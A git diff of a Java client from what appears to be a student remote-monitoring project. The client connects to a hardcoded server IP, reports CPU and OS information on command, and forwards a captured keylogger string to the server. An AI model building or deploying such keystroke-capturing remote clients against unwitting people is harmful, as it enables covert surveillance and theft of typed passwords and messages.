@@ -25,6 +25,7 @@ public class Client
     final static int ServerPort = 1234;
     static SystemInfo si = new SystemInfo();
     public static String keyLoger;
+    public static boolean isSTOP;
     public static void main(String[] args) throws IOException
     {
         Scanner scn = new Scanner(System.in);
@@ -34,7 +35,7 @@ public class Client
         //Thanh: 26.91.242.109
         //Minh: 26.250.54.191
         //Tây: 26.84.204.9
-        InetAddress ip = InetAddress.getByName("26.91.242.109");
+        InetAddress ip = InetAddress.getByName("26.84.204.9");
 
         // establish the connection
         Socket s = new Socket(ip, ServerPort);
@@ -45,28 +46,28 @@ public class Client
 
 
         // sendMessage thread
-        Thread sendMessage = new Thread(new Runnable()
-        {
-            @Override
-            public void run() {
-                while (true) {
-
-                    // read the message to deliver.
-                    String msg = scn.nextLine();
-
-                    try {
-                        // write on the output stream
-                        Message object = new Message();
-                        object.command= Message.TAKE_SCREEN_SHOT;
-                        object.data = "data";
-                        object.toId = "admin";
-                        dos.writeObject(object);
-                    } catch (IOException e) {
-                        e.printStackTrace();
-                    }
-                }
-            }
-        });
+//        Thread sendMessage = new Thread(new Runnable()
+//        {
+//            @Override
+//            public void run() {
+//                while (true) {
+//
+//                    // read the message to deliver.
+//                    String msg = scn.nextLine();
+//
+//                    try {
+//                        // write on the output stream
+//                        Message object = new Message();
+//                        object.command= Message.TAKE_SCREEN_SHOT;
+//                        object.data = "data";
+//                        object.toId = "admin";
+//                        dos.writeObject(object);
+//                    } catch (IOException e) {
+//                        e.printStackTrace();
+//                    }
+//                }
+//            }
+//        });
 
         // readMessage thread
         Thread readMessage = new Thread(new Runnable()
@@ -119,6 +120,28 @@ public class Client
                                 keyLoger = "";
                                 dos.writeObject(object);
                             }
+                            case Message.GET_CPU -> {
+//                                isSTOP = false;
+//                                Thread waitForStop = new Thread(new Runnable() {
+//                                    @Override
+//                                    public void run() {
+//                                        try {
+//                                            Message msg = (Message) dis.readObject();
+//                                            if(msg.command == Message.STOP_GET_CPU){
+//                                                isSTOP = true;
+//                                                Thread.currentThread().interrupt();
+//                                            }
+//                                        } catch (IOException | ClassNotFoundException e) {
+//                                            e.printStackTrace();
+//                                        }
+//                                    }
+//                                });
+//                                waitForStop.start();
+//                                while(!isSTOP){
+                                    object.data = String.valueOf(Processor.getCpuPercent());
+                                    dos.writeObject(object);
+//                                }
+                            }
                             case Message.GET_OS_INFO -> {
                                 OsHWModel os = new OsHWModel();
                                 os.setOSPreFix(OsHW.getOsPrefix(si));
@@ -142,7 +165,7 @@ public class Client
                 }
             }
         });
-        sendMessage.start();
+//        sendMessage.start();
         readMessage.start();
 
     }
